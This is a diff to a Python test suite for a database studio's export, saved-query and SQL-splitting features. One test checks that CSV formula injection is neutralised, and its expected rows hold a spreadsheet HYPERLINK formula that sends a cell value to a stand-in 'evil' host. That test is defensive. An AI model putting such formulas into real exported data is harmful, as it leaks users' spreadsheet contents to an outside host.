@@ -10,6 +10,7 @@ from starlette.testclient import TestClient
 from mizzle.core.errors import MigrationError
 from mizzle.dialects.postgres import PostgresDialect
 from mizzle.dialects.postgres.driver import PostgresDriver
+from mizzle.studio import server
 from mizzle.studio.server import (
     _basic_credentials,
     create_app,
@@ -241,7 +242,9 @@ def test_export_csv_and_json(client: TestClient) -> None:
     csv_resp = client.get(EXPORT, params={"format": "csv", "order": "email"}, headers=AUTH)
     assert csv_resp.status_code == 200
     assert csv_resp.headers["content-type"].startswith("text/csv")
-    assert csv_resp.headers["content-disposition"] == 'attachment; filename="public.users.csv"'
+    disposition = csv_resp.headers["content-disposition"]
+    assert 'filename="public.users.csv"' in disposition
+    assert "filename*=UTF-8''public.users.csv" in disposition
     lines = csv_resp.text.strip().splitlines()
     assert lines[0].split(",") == ["id", "email", "bio", "role", "created_at"]
     assert "ann" in lines[1] and "bob" in lines[2]
@@ -481,7 +484,7 @@ def test_csv_export_neutralizes_formulas(client: TestClient) -> None:
     text = client.get(EXPORT, params={"format": "csv"}, headers=AUTH).text
     rows = list(csv.reader(io.StringIO(text)))
     assert [row[1] for row in rows[1:]] == [
-        "'=HYPERLINK(\"http://evil/?\"&A1,\"x\")",
+        '\'=HYPERLINK("http://evil/?"&A1,"x")',
         "'+1+cmd",
         "'@SUM(1)",
     ]
@@ -523,3 +526,66 @@ def test_ddl_type_allow_list_rejects_constraint_clauses(
     for good in ("integer", "varchar(255)", "numeric(10,2)", "timestamp with time zone"):
         assert ddl._TYPE.fullmatch(good), good
     assert not ddl._DEFAULT.fullmatch("0::int unique")
+
+
+async def test_export_filename_survives_odd_table_names(
+    pg_url: str, driver: PostgresDriver
+) -> None:
+    # SF3: a non-Latin-1 name raised UnicodeEncodeError (500) and a quote broke the header.
+    async with driver.acquire() as conn:
+        await conn.execute('DROP TABLE IF EXISTS public."café"', [])
+        await conn.execute('DROP TABLE IF EXISTS public."q""uote"', [])
+        await conn.execute('CREATE TABLE public."café" (id int)', [])
+        # The identifier contains a literal double quote: doubled inside a quoted name.
+        await conn.execute('CREATE TABLE public."q""uote" (id int)', [])
+    with make_client(pg_url) as client:
+        latin = client.get("/api/tables/public/café/export", headers=AUTH)
+        assert latin.status_code == 200
+        assert "filename*=UTF-8''public.caf%C3%A9.csv" in latin.headers["content-disposition"]
+        quoted = client.get("/api/tables/public/q%22uote/export", headers=AUTH)
+        assert quoted.status_code == 200
+        assert 'filename="public.q_uote.csv"' in quoted.headers["content-disposition"]
+
+
+def test_export_has_no_row_cap(pg_url: str, driver: PostgresDriver) -> None:
+    # SF3: the export was capped at 100,000 rows with no indication, and built in memory.
+    # The rows now come from a streaming cursor, so there is no cap and no LIMIT to lose.
+    with make_client(pg_url) as client:
+        for i in range(15):
+            client.post(ROWS, json={"values": {"email": f"user{i}@x"}}, headers=AUTH)
+        csv_text = client.get(EXPORT, params={"format": "csv"}, headers=AUTH).text
+        assert len(csv_text.strip().splitlines()) == 16  # header + 15
+        js = client.get(EXPORT, params={"format": "json"}, headers=AUTH).json()
+        assert len(js) == 15
+
+    # Nothing in the export path adds a LIMIT (the old 100,000 cap).
+    import inspect
+
+    source = inspect.getsource(server.export_rows)
+    assert "LIMIT" not in source.upper().replace("LIMIT_", "")
+
+
+def test_saved_query_names_may_contain_slashes(client: TestClient) -> None:
+    # SF5: the name is a label, not a path, and "/" used to answer 405.
+    created = client.put("/api/queries/saved/reports/top", json={"sql": "select 1"}, headers=AUTH)
+    assert created.status_code == 201
+    assert created.json() == {"name": "reports/top"}
+    assert client.get("/api/queries/saved", headers=AUTH).json()["saved"] == [
+        {"name": "reports/top", "sql": "select 1"}
+    ]
+    deleted = client.request("DELETE", "/api/queries/saved/reports/top", headers=AUTH)
+    assert deleted.json() == {"deleted": "reports/top"}
+
+
+def test_splitter_handles_escapes_and_nested_comments() -> None:
+    # SF4: E'it\'s' and /* /* */ */ are valid SQL and must not split early.
+    assert split_statements("select E'it\\'s; x' as s; select 2") == [
+        "select E'it\\'s; x' as s",
+        "select 2",
+    ]
+    assert split_statements("select 1; /* a /* nested ; */ still comment */ select 2") == [
+        "select 1",
+        "/* a /* nested ; */ still comment */ select 2",
+    ]
+    # A plain '...' has no backslash escape, so a backslash stays literal.
+    assert split_statements("select 'a\\\\'; select 2") == ["select 'a\\\\'", "select 2"]
